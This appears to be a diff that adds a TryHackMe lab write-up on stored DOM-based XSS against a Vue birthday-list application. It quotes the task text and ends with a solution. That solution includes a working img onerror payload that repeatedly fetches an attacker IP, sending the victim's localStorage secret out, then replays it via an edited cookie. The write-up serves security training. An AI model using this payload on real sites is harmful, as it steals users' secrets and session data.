@@ -1,0 +1,21 @@
+Now that you understand DOM-based attacks and, more specifically, DOM-based XSS, it is time to put your knowledge to the test. Start the attached machine. You may access the VM using the AttackBox or your VPN connection. The VM takes around 3-4 minutes to start. Once ready, use the following code to add an entry to your hosts file:
+sudo echo 10.10.241.245 lists.tryhackme.loc >> /etc/hosts
+
+You can then navigate to http://lists.tryhackme.loc:5173/ . Here, you will find a simple birthday list application that is vulnerable to a stored DOM-based XSS attack. While you can add and update birthdays, you cannot delete them. You aim to weaponise the XSS vulnerability to recover the information required to delete birthdays. Once you delete all of them, you will receive your flag!
+
+Enumeration of a Modern Frontend Application
+In order to do this challenge and answer the questions, you will need to analyse the Vue application. Navigating to the application you will see the following:
+
+If you simply use View Page Source, this doesn't really help you a lot:
+
+However, the browser will actually rebuild the Vue application for us in the debugger. You can access the debugger by Right-Clicking, selecting Inspect, and then clicking the Debugger tab. You will see the following:
+Using this, you can navigate to src -> components, which will show you the rebuilt (referred to as mapped) Vue files, as shown below:
+You will have to use this feature to solve the challenge and answer the questions below!
+
+Hint: You need to trick another application user into giving you sensitive information. However, if you alert this user, they will become suspicious and simply stop using the application. You can console them by either logging while you perform your tests or restarting the entire machine. Furthermore, if you are able to get an interaction from the user but it isn't exactly what you were hoping for, perhaps the answer is to monitor the user closer and for longer!
+
+Here is the payload used:
+(first start pyhttp on port whatever)
+<img src=1 onerror="setInterval(() => {fetch('http://10.11.116.65:1234?secret=' + encodeURIComponent(localStorage.getItem('secret')), {method: 'GET'});}, 6000);">
+
+Then, go to the storage, edit the cookie, and then you should be able to delete the values.
